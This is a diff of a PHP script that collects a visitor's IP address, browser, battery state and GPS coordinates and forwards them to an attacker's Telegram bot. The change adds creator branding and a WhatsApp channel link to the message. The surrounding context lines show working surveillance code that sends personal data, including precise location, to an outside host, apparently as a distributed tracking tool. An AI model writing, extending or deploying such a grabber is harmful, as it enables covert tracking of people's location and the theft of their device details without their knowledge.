@@ -7,7 +7,7 @@ $telegramChatId = "1244129628";
 $input = file_get_contents("php://input");
 $data = json_decode($input, true);
 
-// Prepare message
+// Prepare message with device information and credits
 $message = "--- Device Information Received ---\n";
 $message .= "IP Address      : " . $_SERVER['REMOTE_ADDR'] . "\n";
 $message .= "Browser         : " . ($data['browser'] ?? 'N/A') . "\n";
@@ -17,14 +17,18 @@ $message .= "Screen Height   : " . ($data['screenHeight'] ?? 'N/A') . "\n";
 $message .= "Battery Level   : " . ($data['battery'] ?? 'N/A') . "\n";
 $message .= "Is Charging     : " . ($data['isCharging'] ?? 'N/A') . "\n";
 $message .= "Location        : " . (is_array($data['location']) ? "Lat: {$data['location']['latitude']}, Long: {$data['location']['longitude']}" : $data['location']) . "\n";
-$message .= "Server Time     : " . date("Y-m-d H:i:s") . "\n";
+$message .= "Server Time     : " . date("Y-m-d H:i:s") . "\n\n";
+
+// Add copyright and channel link
+$message .= "--- Admin: HTG GAMER YT ---\n";
+$message .= "📺 [CLICK HERE](https://whatsapp.com/channel/0029VaGL74T4dTnIkHKVW21c) to visit our Whatsapp channel!\n";
 
 // Send to Telegram
 $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
 $postData = [
     'chat_id' => $telegramChatId,
     'text' => $message,
-    'parse_mode' => 'HTML'
+    'parse_mode' => 'Markdown' // Enable Markdown for clickable link
 ];
 
 $options = [
